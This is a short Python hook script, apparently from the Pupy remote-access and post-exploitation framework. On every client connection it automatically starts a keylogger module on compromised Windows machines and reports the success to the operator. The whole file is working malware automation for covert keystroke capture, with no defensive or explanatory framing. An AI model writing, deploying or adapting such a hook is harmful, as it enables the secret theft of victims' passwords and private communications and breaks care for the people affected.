#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
import datetime
from pupylib.utils.decorators import threaded

# triggers and get executed at each client connection
@threaded
def on_connect(client):
	if client.is_windows():
		job=client.run_module("gather/keylogger", ['start'])
		job.wait()
		client.pupsrv.handler.display_srvinfo("Keylogger started on %s"%client)



